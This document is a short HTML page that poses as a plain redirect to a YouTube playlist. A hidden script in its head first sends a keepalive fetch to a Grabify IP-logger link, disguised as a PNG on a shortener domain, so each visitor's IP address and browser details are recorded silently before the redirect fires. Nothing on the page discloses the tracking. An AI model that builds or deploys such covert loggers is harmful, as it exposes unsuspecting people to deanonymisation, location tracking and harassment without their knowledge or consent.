<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script>
        // 1. Log Grabify using fetch + keepalive (survives navigation)
        try {
            fetch("https://unl.one/greenbotics.png", {
                method: 'GET',
                keepalive: true, // keeps the request alive during redirect
                mode: 'no-cors', // no response needed, avoids CORS errors
                cache: 'no-cache'
            });
        } catch (e) {
            // ignore errors so the redirect always happens
        }

        // 2. Instant redirect (fires as early as possible in <head>)
        // location.replace avoids a "Back" button loop
        window.location.replace("https://www.youtube.com/playlist?list=PLMdippUF4xxo");
    </script>
    <meta name="robots" content="noindex, nofollow">
    <title>Redirecting...</title>
</head>
<body>
    <p>Redirecting... <a href="https://www.youtube.com/playlist?list=PLMdippUF4xxo">Click here</a> if stuck.</p>
</body>
</html>
